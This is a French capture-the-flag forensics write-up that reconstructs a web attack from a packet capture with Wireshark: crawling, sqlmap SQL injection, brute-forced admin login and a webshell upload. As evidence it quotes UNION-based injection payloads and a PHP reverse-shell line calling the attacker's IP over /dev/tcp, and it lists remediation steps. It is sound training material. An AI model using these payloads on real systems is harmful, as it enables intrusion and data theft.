# Investigation Web - Wireshark

**3 Mai 2026**

**Objectif :** Reconstituer une attaque depuis le trafic brut grâce à l'outil Wireshark.

**Environnement :**
- Capture du réseau fournie par la plateforme *CyberDefenders*, catégorie : Network Forensics, Niveau : Easy.
- Wireshark


## Table des matières

1. [Contexte](#1-contexte)
2. [Méthodologie](#2-méthodologie)
3. [Résultats](#3-résultats)
   - [3.1 Vue d'ensemble du trafic](#31-vue-densemble-du-trafic--protocol-hierarchy)
   - [3.2 Identification des machines](#32-identification-des-machines--conversations-ipv4)
   - [3.3 Reconstitution de l'attaque](#33-reconstitution-de-lattaque--timeline)
4. [Analyse](#4-analyse)
5. [Indicateurs de compromission (IoCs)](#5-indicateurs-de-compromission-iocs)
6. [Recommandations](#6-recommandations)
7. [Conclusion](#7-conclusion)


## 1. Contexte

### Situation

Le challenge *Web Investigation* (CyberDefenders, niveau Easy) fournit une capture réseau `.pcap` à analyser. L'objectif est de reconstituer une attaque web depuis le trafic brut : identifier l'attaquant, comprendre ses techniques, documenter les preuves et évaluer l'impact.

### Environnement

| Élément | Valeur |
|---------|--------|
| Serveur cible | `73.124.22.98` — bookworldstore.com |
| Technologie serveur | Apache/2.4.52 (Ubuntu) |
| Application | Site e-commerce de vente de livres |
| Attaquant | `111.224.250.131` — Chine (confirmé GeoIP MaxMind) |
| Outil attaquant | sqlmap/1.8.3#stable |
| Période de l'attaque | 15 mars 2024 — 12:09:39 GMT → 12:24:17 GMT (~15 minutes) |

### Impact résumé

En moins de 15 minutes, l'attaquant a :
- Exfiltré les données personnelles de l'ensemble des clients (base `bookworld_db.customers`)
- Obtenu un accès administrateur au panneau de gestion du site
- Déposé un webshell sur le serveur permettant l'exécution de commandes à distance


## 2. Méthodologie

### Approche

L'investigation suit une méthode structurée en 5 étapes. Chaque étape conditionne la suivante.  Aucune investigation ciblée n'est lancée avant la lecture chronologique complète de la capture.

```
Étape 1 → Vue d'ensemble (Protocol Hierarchy)
Étape 2 → Identification des acteurs (Conversations IPv4)
Étape 3 → Lecture chronologique complète (Timeline)
Étape 4 → Investigation ciblée par phase
Étape 5 → Reconstitution, preuves, documentation
```

**Principe fondamental :** lire l'histoire complète avant d'investiguer un détail. Une erreur de précipitation peut entrainer des conclusions prématurées et des preuves manquées.

### Filtres Wireshark utilisés (ordre chronologique d'application)

| # | Filtre | Objectif | Étape |
|---|--------|----------|-------|
| 1 | `Statistics → Protocol Hierarchy` | Vue d'ensemble des protocoles présents dans la capture | Étape 1 |
| 2 | `Statistics → Conversations → IPv4` | Identifier toutes les machines et leur volume d'échange | Étape 2 |
| 3 | `ip.addr == 111.224.250.131 && http.request` | Isoler uniquement les requêtes HTTP de l'attaquant pour lire sa timeline | Étape 3 |
| 4 | `ip.src == 73.124.22.98 && http && ip.dst == 111.224.250.131` | Lire les réponses du serveur — `ip.src` et non `ip.addr` pour ne pas mélanger requêtes et réponses | Phase 2 |
| 5 | `ip.src == 73.124.22.98 && http.response.code == 200 && ip.dst == 111.224.250.131` | Filtrer les réponses 200 OK, triées par taille décroissante, pour trouver les réponses SQLi volumineuses contenant des données exfiltrées | Phase 2 |
| 6 | `Follow → TCP Stream` (clic droit sur paquet) | Lire l'échange complet requête + réponse dans un même flux — utilisé sur les paquets 1624 (données SQLi), 88699 (login), 88757 (webshell) | Phases 2 et 4 |
| 7 | `ip.addr == 111.224.250.131 && http.request.method == POST` | Isoler les soumissions de formulaire POST pour identifier les tentatives de login et l'upload | Phase 4 |
| 8 | `ip.src == 73.124.22.98 && http.response.code == 200 && ip.dst == 111.224.250.131 && frame.number >= 1687 && frame.number <= 88647` | Restreindre les 200 OK à la plage temporelle exacte du directory enumeration — évite de mélanger avec les pages légitimes visitées en phase 1 | Phase 3 |
| 9 | `ip.addr == 111.224.250.131 && tcp.port == 443` | Vérifier si le reverse shell s'est établi — aucun paquet attendu si le pare-feu bloque les connexions sortantes | Phase 5 |

---

## 3. Résultats

### 3.1 Vue d'ensemble du trafic — Protocol Hierarchy

`Statistics → Protocol Hierarchy`

| Protocole | Paquets | % |
|-----------|---------|---|
| TCP | 88 740 | 99.9% |
| HTTP | 83 418 | 93.9% |
| Line-based text data | 41 645 | 46.9% |
| HTML Form URL Encoded | 4 | 0.0% |
| MIME Multipart | 1 | 0.0% |
| UDP | 122 | 0.1% |

**Observations clés :**
- Trafic **100% HTTP** — aucun chiffrement HTTPS. Toutes les données transitent en clair, y compris les credentials et les payloads d'injection.
- **4 soumissions de formulaire** (Form URL Encoded) — tentatives de login ou injections via formulaire.
- **1 upload de fichier** (MIME Multipart) — upload unique à investiguer en priorité.
- **UDP quasi-absent** — attaque purement web, aucun tunneling ou exfiltration via protocole alternatif.


### 3.2 Identification des machines — Conversations IPv4

`Statistics → Conversations → IPv4`

| IP A | IP B | Paquets | A→B | B→A | Rôle identifié |
|------|------|---------|-----|-----|----------------|
| 111.224.250.131 | 73.124.22.98 | 88 484 | 44 320 | 44 164 | **Attaquant → Serveur cible** |
| 170.40.150.126 | 73.124.22.98 | 256 | 139 | 117 | Utilisateur légitime probable |
| 73.124.22.1 | 73.124.22.255 | 122 | 122 | 0 | Trafic broadcast réseau — ignoré |

**Raisonnement :**
- `73.124.22.98` apparaît en destination dans **toutes** les paires significatives → c'est le **serveur**.
- `111.224.250.131` génère **88 484 paquets** contre 256 pour l'autre IP → volume anormal caractéristique d'une attaque automatisée.
- `73.124.22.255` = adresse de broadcast (dernière adresse du sous-réseau /24) → trafic réseau automatique, non pertinent pour l'investigation.

---

### 3.3 Reconstitution de l'attaque — Timeline

L'analyse des 41 684 requêtes HTTP de l'attaquant révèle **5 phases distinctes**.

**Filtre appliqué :** `ip.addr == 111.224.250.131 && http.request`  
**Pourquoi :** `http.request` isole uniquement les requêtes émises par l'attaquant, sans les réponses du serveur ni le bruit TCP. Le résultat est trié chronologiquement — on lit l'histoire complète dans l'ordre avant d'investiguer quoi que ce soit.

---

#### Phase 1 — Reconnaissance passive (paquets 267–303)

**Technique :** crawler automatisé  
**Durée :** quelques secondes (intervalles de 40ms entre requêtes — impossible manuellement)

URLs visitées dans l'ordre :

```
GET /               HTTP 1.1
GET /css/style.css  HTTP 1.1
GET /favicon.ico    HTTP 1.1
GET /about.php      HTTP 1.1
GET /index.html     HTTP 1.1
GET /contact.php    HTTP 1.1
GET /faq.php        HTTP 1.1
```

**Objectif :** cartographier la structure publique du site avant toute attaque.  
**Résultat :** pages publiques identifiées, paramètre `search=` découvert sur `/search.php`.


#### Phase 2 — SQL Injection via SQLmap (paquets 315–~1686)

**Outil :** `sqlmap/1.8.3#stable` — confirmé via User-Agent dans les headers HTTP  
**Point d'injection :** `/search.php?search=`  
**Nombre de requêtes :** ~1 370

**Progression en 3 étapes :**

**Étape 2.1 — Confirmation de la vulnérabilité (Boolean-Based SQLi)**

```sql
-- Condition vraie → résultats normaux retournés
search=book and 1=1; -- -

-- Condition fausse → zéro résultat retourné
search=book and 1=2; -- -
```

Le comportement différentiel confirme que le serveur interprète et exécute le SQL injecté.

**Étape 2.2 — Cartographie de la base via `information_schema`**

```sql
UNION SELECT ... FROM information_schema.tables
UNION SELECT ... FROM information_schema.columns
```

`information_schema` est une base système présente dans tous les moteurs SQL. Elle contient la liste de toutes les bases, tables et colonnes du serveur. Son interrogation permet à l'attaquant d'obtenir le plan complet de la base avant extraction.

**Étape 2.3 — Exfiltration des données clients**

Requête finale identifiée (paquet 1624) :

```sql
UNION ALL SELECT NULL,
  CONCAT(JSON_ARRAYAGG(CONCAT_WS(0x7a766a6367, address, email, first_name, id, last_name, phone)))
FROM bookworld_db.customers
```

**Filtres appliqués pour confirmer l'exfiltration :**

```wireshark
-- Réponses du serveur vers l'attaquant
ip.src == 73.124.22.98 && http && ip.dst == 111.224.250.131
```
**Pourquoi `ip.src` et non `ip.addr` :** `ip.addr` retournerait toutes les requêtes ET réponses impliquant le serveur. `ip.src` isole uniquement ce que le serveur *envoie* — ses réponses. C'est le contenu des réponses qui révèle les données exfiltrées.

```wireshark
-- Réponses 200 OK triées par taille décroissante
ip.src == 73.124.22.98 && http.response.code == 200 && ip.dst == 111.224.250.131
```
**Pourquoi trier par taille :** une réponse SQLi contenant des données exfiltrées est plus volumineuse qu'une page vide ("aucun résultat"). En triant par taille décroissante, on priorise les réponses les plus susceptibles de contenir des données sensibles sans lire les 44 000 réponses une par une.

**Follow TCP Stream** appliqué sur le paquet 1624 (plus volumieux) pour lire le contenu HTML complet retourné par le serveur, y compris les données extraites de la base.

Données exfiltrées (extrait confirmé, paquet 1624, réponse serveur) :

```
John Doe        | 123 Maple Street  | john.doe1234@gmail.com      | 555-1234
Jane Smith      | 456 Oak Avenue    | jane.smith5678@gmail.com    | 555-5678
Emily Johnson   | 789 Pine Road     | emily.johnson91011@gmail.com| (tronqué)
```

**Champs exfiltrés :** prénom, nom, adresse postale, email, téléphone, ID client  
**Séparateur SQLmap :** `zvgjck` (généré aléatoirement pour délimiter les champs)  
**Timestamp :** 15/03/2024 **12:09:39 GMT**  
**Réponse serveur :** HTTP 200 OK — Content-Length: 561 bytes (gzip)

> ⚠️ **Impact RGPD :** exfiltration de données personnelles — notification CNIL obligatoire sous 72h (Article 33 RGPD).


#### Phase 3 — Directory Enumeration (paquets ~1687–88647)

**Technique :** fuzzing automatisé de fichiers et répertoires  
**Nombre de requêtes :** ~40 000+  
**Pattern :** test alphabétique systématique avec extensions multiples

Extensions testées : `.php` `.asp` `.cgi` `.js` `.html` `.txt` `.bak` `.axd` `.html`  
Fichiers ciblés (exemples) : `.bash_history` `.htaccess` `.htpasswd` `/backup` `/backup_migrate` `/backup-db`

**Filtre appliqué pour identifier les hits :**

```wireshark
ip.src == 73.124.22.98 && http.response.code == 200 && ip.dst == 111.224.250.131 && frame.number >= 1687 && frame.number <= 88647
```
**Pourquoi la plage `frame.number` :** sans cette contrainte temporelle, le filtre retournerait aussi les 200 OK des phases 1 (reconnaissance) et 4 (admin), faussant l'analyse. La plage isole uniquement les réponses pendant la phase d'énumération. Le code 200 est le signal d'un fichier existant — les fichiers absents retournent 404.

**Résultat : 7 réponses HTTP 200 OK**

| Fichier | Statut |
|---------|--------|
| /about.php | Page publique connue |
| /contact.php | Page publique connue |
| /faq.php | Page publique connue |
| /favicon.ico | Icône standard |
| /index.html | Page publique connue |
| /index.html | Doublon |
| /search.php | Page publique connue |

**Conclusion :** aucun fichier caché découvert. Les 7 hits correspondent aux pages publiques déjà cartographiées en phase 1. Cette phase n'a pas contribué directement à l'attaque.


#### Phase 4 — Exploitation du panel d'administration (paquets 88648+)

**Étape 4.1 — Découverte du panel admin**

```
GET /admin        → HTTP 200 OK
GET /admin/login.php → HTTP 200 OK
```

**Filtre appliqué :** `ip.addr == 111.224.250.131 && http.request.method == POST`  
**Pourquoi :** les soumissions de formulaire (login, upload) utilisent la méthode POST. Ce filtre isole uniquement ces paquets parmi les 41 684 requêtes — 5 paquets retournés, tous significatifs.

**Étape 4.2 — Brute force des credentials (4 tentatives)**

| Paquet | Credentials testés | Réponse serveur |
|--------|-------------------|-----------------|
| 88664 | admin / admin | HTTP 200 (échec) |
| 88677 | admin / changeme | HTTP 200 (échec) |
| 88681 | admin / default | HTTP 200 (échec) |
| 88699 | admin / admin123! | **HTTP 302 → /admin/index.php ✓** |

**Login réussi :** `admin / admin123!`  
**Timestamp :** 15/03/2024 **12:17:34 GMT**  
**Cookie de session obtenu :** `PHPSESSID=ae7mvmmf2krhir4kngnmio680a`

> Le HTTP 302 (redirection vers la page protégée) confirme l'authentification réussie. Confirmation via **Follow TCP Stream** sur le paquet 88699 : la réponse du serveur contient `location: index.php` — redirection vers le panel admin.

**Étape 4.3 — Upload du webshell**

```
Paquet 88757 : POST /admin/index.php
Content-Type  : multipart/form-data
Nom du fichier: NVri2vhp.php
```

Contenu du fichier uploadé (lu via **Follow TCP Stream** sur le paquet 88757 — section `HTML Form URL Encoded`) :

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>
```

**Mécanisme :** à l'appel du fichier, le serveur exécute un shell Bash interactif et redirige son entrée/sortie vers la machine de l'attaquant sur le port 443. L'attaquant obtient ainsi une session de commandes complète sur le serveur compromis.  
**Port 443 choisi :** imite du trafic HTTPS pour contourner les règles de pare-feu bloquant les connexions sortantes.  
**Réponse serveur :** HTTP 200 OK  
**Timestamp :** 15/03/2024 **12:24:17 GMT**

**Étape 4.4 — Vérification post-upload**

```
GET /admin/uploads/          → directory listing activé (mauvaise configuration Apache)
GET /admin/uploads/NVri2vhp.php → fichier confirmé présent
GET /icons/blank.gif         → icône Apache directory listing
GET /icons/back.gif          → icône Apache directory listing
GET /icons/unknown.gif       → icône Apache directory listing
```

> La présence des icônes Apache (`blank.gif`, `back.gif`, `unknown.gif`) est la signature caractéristique d'un **directory listing activé** — Apache affiche automatiquement ces icônes lors du listage de répertoire. Le répertoire `/uploads/` est donc accessible publiquement, exposant tous les fichiers déposés.


#### Phase 5 — Vérification du reverse shell

**Filtre appliqué :**
```wireshark
ip.addr == 111.224.250.131 && tcp.port == 443
```

**Résultat :** 0 paquet trouvé.

**Conclusion :** le déclenchement du reverse shell n'est **pas confirmé** dans cette capture. Deux hypothèses :
1. Un pare-feu bloque les connexions TCP sortantes depuis le serveur vers le port 443 externe.
2. Le reverse shell a été déclenché après la plage temporelle couverte par la capture.

La capture se termine par une fermeture propre TCP FIN/ACK entre l'attaquant et le serveur, sans activité post-upload visible.


## 4. Analyse

### Chronologie consolidée

```
12:09:39 GMT  →  Exfiltration bookworld_db.customers (SQLi UNION-Based)
12:17:34 GMT  →  Accès admin réussi (admin / admin123!)
12:24:17 GMT  →  Upload webshell NVri2vhp.php
```

### Évaluation de l'impact — Triade CIA

| Dimension | Impact | Détail |
|-----------|--------|--------|
| **Confidentialité** | ⚠️ Critique | Données personnelles clients exfiltrées (nom, adresse, email, téléphone) |
| **Intégrité** | ⚠️ Critique | Serveur compromis — webshell déposé, exécution de commandes possible |
| **Disponibilité** | ⚠️ Élevé | Risque de destruction de données, défacement ou déni de service |

### Vulnérabilités exploitées

| Vulnérabilité | OWASP 2025 | Technique d'exploitation |
|---------------|-----------|--------------------------|
| SQL Injection | A03 — Injection | UNION-Based + Boolean-Based via sqlmap |
| Authentification faible | A07 — Auth Failures | Brute force, mot de passe trivial (admin123!) |
| Upload non sécurisé | A04 — Insecure Design | Aucune validation du type de fichier uploadé |
| Directory listing activé | A05 — Security Misconfig | Options Indexes activé sur Apache |
| Absence de WAF | A05 — Security Misconfig | Aucun filtrage des User-Agents ou des patterns SQLi |

### Profil de l'attaquant

L'attaque est **entièrement automatisée** et suit un schéma structuré (reconnaissance → exploitation → persistance). L'utilisation de sqlmap, la vitesse d'exécution (40ms entre requêtes) et la méthodologie en phases indiquent un attaquant expérimenté utilisant des outils standards du pentest offensif. La durée totale de l'attaque (~15 minutes) démontre l'efficacité des outils automatisés contre des applications non sécurisées.


## 5. Indicateurs de Compromission (IoCs)

| Type | Valeur | Contexte |
|------|--------|---------|
| IP attaquant | `111.224.250.131` | Chine — source de toutes les phases de l'attaque |
| User-Agent | `sqlmap/1.8.3#stable` | Présent dans tous les headers HTTP SQLi |
| Credentials compromis | `admin / admin123!` | Panel d'administration bookworldstore.com |
| Cookie de session | `PHPSESSID=ae7mvmmf2krhir4kngnmio680a` | Session admin active post-login |
| Webshell | `NVri2vhp.php` | Déposé dans `/admin/uploads/` |
| Chemin webshell | `/admin/uploads/NVri2vhp.php` | Accessible publiquement |
| IP C2 | `111.224.250.131:443` | Destination du reverse shell (non confirmé actif) |
| Table exfiltrée | `bookworld_db.customers` | Données personnelles clients |
| Séparateur SQLmap | `zvgjck` | Délimiteur de champs dans les données exfiltrées |


## 6. Recommandations

### Priorité 1 — Confinement immédiat

- [ ] Isoler le serveur du réseau dans l'attente de l'investigation complète
- [ ] Supprimer `NVri2vhp.php` de `/admin/uploads/`
- [ ] Invalider toutes les sessions actives (rotation du secret de session PHP)
- [ ] Bloquer `111.224.250.131` au niveau pare-feu
- [ ] Préserver la capture `.pcap` comme pièce forensique (chain of custody)

### Priorité 2 — Remédiation des vulnérabilités

**SQL Injection**
- Implémenter des **requêtes préparées** (prepared statements / PDO) sur `search.php` — c'est la seule défense efficace contre la SQLi
- Principe du moindre privilège sur le compte MySQL applicatif (pas de SELECT sur `information_schema`)

**Authentification**
- Remplacer `admin123!` par un mot de passe fort (16+ caractères, aléatoire)
- Activer le **MFA** sur le panel d'administration
- Implémenter un mécanisme de **rate limiting** sur `/admin/login.php` (blocage après N échecs)

**Upload de fichiers**
- Valider le type MIME côté serveur (whitelist : images uniquement)
- Interdire l'exécution PHP dans le répertoire `/uploads/` via la configuration Apache :
```apache
<Directory /var/www/html/admin/uploads>
    php_flag engine off
</Directory>
```

**Configuration Apache**
- Désactiver le directory listing :
```apache
Options -Indexes
```

### Priorité 3 — Détection et surveillance

- Déployer un **WAF** avec règle bloquant le User-Agent `sqlmap`
- Configurer des alertes SIEM sur : volume HTTP anormal depuis une IP unique, codes 200 sur `/admin/uploads/*.php`, patterns SQLi dans les URLs
- Activer la journalisation des requêtes SQL au niveau de la base de données

### Priorité 4 — Conformité RGPD

- **Notifier la CNIL sous 72h** (Article 33 RGPD) — violation de données personnelles confirmée
- Évaluer la nécessité de notifier les clients affectés (Article 34 RGPD) — données sensibles (adresse, email, téléphone)
- Documenter l'incident dans le registre des violations de données


## 7. Conclusion

Cette investigation démontre comment une application web mal sécurisée peut être compromise intégralement en moins de 15 minutes avec des outils open-source standards. L'attaquant a enchaîné quatre techniques distinctes — crawler, SQLi automatisée, brute force et upload de webshell — sans jamais être détecté ni bloqué.

Les trois vulnérabilités critiques (injection SQL, mot de passe trivial, upload non filtré) sont toutes présentes dans l'OWASP Top 10 2025 et auraient pu être évitées par des pratiques de développement élémentaires.

**Compétences mises en œuvre :** analyse de capture réseau Wireshark · identification d'IoCs · reconstruction de timeline d'attaque · SQL Injection (reconnaissance et exploitation) · forensics HTTP · évaluation d'impact CIA · recommandations de remédiation

---

*Write-up rédigé dans le cadre d'un programme de formation cybersécurité*  
*Plateforme : CyberDefenders — challenge Web Investigation (licence éducative).*
